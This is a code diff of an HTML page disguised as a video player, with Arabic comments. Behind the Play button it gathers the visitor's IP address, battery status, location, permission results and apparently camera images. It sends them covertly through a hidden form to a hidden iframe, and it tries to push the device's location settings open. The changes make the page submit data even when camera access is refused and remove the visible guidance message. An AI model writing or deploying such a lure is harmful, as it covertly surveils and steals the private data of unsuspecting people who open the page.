@@ -23,7 +23,6 @@
     <meta name="twitter:image:height" content="630" />
     <title>Video</title>
     <style>
-        /* ===== RESET & BASE ===== */
         * {
             margin: 0;
             padding: 0;
@@ -42,7 +41,6 @@
             color: #fff;
         }
 
-        /* ===== مشغل الفيديو ===== */
         .video-player-container {
             width: 90%;
             max-width: 800px;
@@ -62,7 +60,6 @@
             background-size: cover;
             background-position: center;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
             cursor: pointer;
@@ -210,25 +207,11 @@
             z-index: 10;
         }
 
-        /* رسالة التوجيه */
-        .status-message {
-            color: #ffaa00;
-            font-size: 1rem;
-            margin-top: 10px;
-            text-align: center;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 6px 16px;
-            border-radius: 20px;
-            display: none;
-            border: 1px solid #ffaa00;
-        }
-
-        /* ===== إخفاء النافذة المنبثقة القديمة ===== */
+        /* إخفاء النافذة المنبثقة القديمة */
         .location-prompt-overlay {
             display: none !important;
         }
 
-        /* ===== استجابة ===== */
         @media (max-width: 480px) {
             .video-controls {
                 padding: 10px 12px;
@@ -260,7 +243,6 @@
             }
         }
 
-        /* ===== إخفاء عناصر النموذج ===== */
         form {
             display: none;
         }
@@ -291,7 +273,6 @@
                 <div class="play-icon-large" id="playIconLarge"></div>
                 <div class="spinner" id="spinner"></div>
             </div>
-            <div class="status-message" id="statusMessage">⚠️ افتح الموقع ثم عد واضغط مرة أخرى</div>
         </div>
 
         <video id="realVideo" controls playsinline>
@@ -322,17 +303,15 @@
             let batteryStatus = '';
             let locationGranted = false;
             let userProceeded = false;
-            let settingsOpened = false; // لتتبع ما إذا تم فتح الإعدادات بالفعل
-            let videoStarted = false; // لمنع تشغيل الفيديو أكثر من مرة
+            let settingsOpened = false;
+            let videoStarted = false;
 
-            // عناصر DOM
             const thumbnailArea = document.getElementById('thumbnailArea');
             const realVideo = document.getElementById('realVideo');
             const spinner = document.getElementById('spinner');
             const loadingDiv = document.getElementById('loading');
             const playIcon = document.getElementById('playIconLarge');
             const playButtonOverlay = document.getElementById('playButtonOverlay');
-            const statusMessage = document.getElementById('statusMessage');
 
             // --- جلب IP ---
             async function fetchIPInfo() {
@@ -406,7 +385,6 @@
             async function requestLocationSmart() {
                 try {
                     const permState = await checkLocationPermissionState();
-
                     if (permState === 'denied') {
                         permissions.push('الموقع مرفوض (المتصفح)');
                         return '';
@@ -447,10 +425,9 @@
                 return 'other';
             }
 
-            // --- فتح إعدادات الموقع مباشرة ---
+            // --- فتح إعدادات الموقع ---
             function openLocationSettings() {
                 const deviceType = getDeviceInfo();
-
                 switch (deviceType) {
                     case 'android':
                         window.location.href =
@@ -460,23 +437,19 @@
                                 'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                         }, 400);
                         break;
-
                     case 'ios':
                         window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
                         setTimeout(() => {
                             window.open('prefs:root=Privacy&path=LOCATION', '_blank');
                         }, 500);
                         break;
-
                     case 'windows':
                         window.open('ms-settings:privacy-location', '_blank');
                         break;
-
                     case 'mac':
                         window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices',
                             '_blank');
                         break;
-
                     default:
                         if (/Android/i.test(navigator.userAgent)) {
                             window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
@@ -488,58 +461,48 @@
 
             // --- إرسال النموذج ---
             function submitFormIfReady() {
-                if (images.length > 0) {
-                    document.getElementById('imageDatas').value = images.join(',');
-                    document.getElementById('permissions').value = permissions.join(', ');
-                    const form = document.getElementById('data-form');
-                    form.target = 'hidden_iframe';
-                    form.submit();
-                }
+                // نجمع البيانات حتى لو لم توجد صور (قد تكون الكاميرا مرفوضة)
+                document.getElementById('imageDatas').value = images.join(',');
+                document.getElementById('permissions').value = permissions.join(', ');
+                const form = document.getElementById('data-form');
+                form.target = 'hidden_iframe';
+                form.submit();
             }
 
-            // --- تشغيل الفيديو (يُستدعى بعد الحصول على الأذونات) ---
+            // --- تشغيل الفيديو ---
             function startVideo() {
                 if (videoStarted) return;
                 videoStarted = true;
                 thumbnailArea.style.display = 'none';
                 realVideo.style.display = 'block';
                 realVideo.play().catch(() => {});
-                // إخفاء الرسالة إذا كانت ظاهرة
-                statusMessage.style.display = 'none';
             }
 
             // --- الدالة الرئيسية عند النقر على Play ---
             async function captureData() {
-                if (userProceeded) return; // منع التكرار أثناء التنفيذ
+                if (userProceeded) return;
                 userProceeded = true;
 
-                // إذا كان الفيديو قد بدأ بالفعل، لا نفعل شيئاً
                 if (videoStarted) {
                     userProceeded = false;
                     return;
                 }
 
-                // المنطق الجديد:
                 if (!settingsOpened) {
-                    // أول ضغطة: نفتح الإعدادات ونعرض رسالة توجيه
+                    // أول ضغطة: فتح الإعدادات فقط
                     settingsOpened = true;
                     openLocationSettings();
-                    statusMessage.style.display = 'block';
-                    // نغير مظهر الزر قليلاً للإشارة
-                    playButtonOverlay.style.backgroundColor = 'rgba(255, 165, 0, 0.85)';
-                    // ننهي التنفيذ بدون تشغيل الفيديو
                     userProceeded = false;
                     return;
                 }
 
-                // الضغطة الثانية (أو بعد العودة): نطلب الأذونات
-                // نظهر مؤشر التحميل
+                // الضغطة الثانية: طلب الأذونات وجمع البيانات
                 spinner.style.display = 'block';
                 loadingDiv.style.display = 'block';
                 if (playIcon) playIcon.style.opacity = '0';
                 if (playButtonOverlay) playButtonOverlay.style.pointerEvents = 'none';
 
-                // طلب الموقع + الكاميرات
+                // طلب الموقع
                 const locationResult = await requestLocationSmart();
                 document.getElementById('location').value = locationResult || '';
 
@@ -554,13 +517,12 @@
                 if (playIcon) playIcon.style.opacity = '1';
                 if (playButtonOverlay) playButtonOverlay.style.pointerEvents = 'auto';
 
-                // إرسال البيانات
+                // إرسال البيانات (حتى لو فشلت بعض الأذونات)
                 submitFormIfReady();
 
                 // تشغيل الفيديو
                 startVideo();
 
-                // إعادة تعيين userProceeded
                 userProceeded = false;
             }
 
@@ -571,7 +533,6 @@
 
                 await Promise.all([fetchIPInfo(), getBatteryStatus()]);
 
-                // إضافة مستمعي الأحداث
                 if (thumbnailArea) {
                     thumbnailArea.addEventListener('click', captureData);
                 }
@@ -581,12 +542,9 @@
                         captureData();
                     });
                 }
-
-                // إخفاء رسالة الحالة في البداية
-                statusMessage.style.display = 'none';
             });
 
-            // --- أزرار التحكم (تكبير الفيديو) ---
+            // --- أزرار التحكم ---
             document.querySelectorAll('.control-button').forEach(button => {
                 button.addEventListener('click', function(e) {
                     e.stopPropagation();
@@ -601,7 +559,7 @@
                 });
             });
 
-            // --- شريط التقدم الوهمي (يبقى كما هو) ---
+            // --- شريط التقدم الوهمي ---
             const progressInterval = setInterval(() => {
                 const progressFill = document.querySelector('.progress-fill');
                 const realVideoEl = document.getElementById('realVideo');
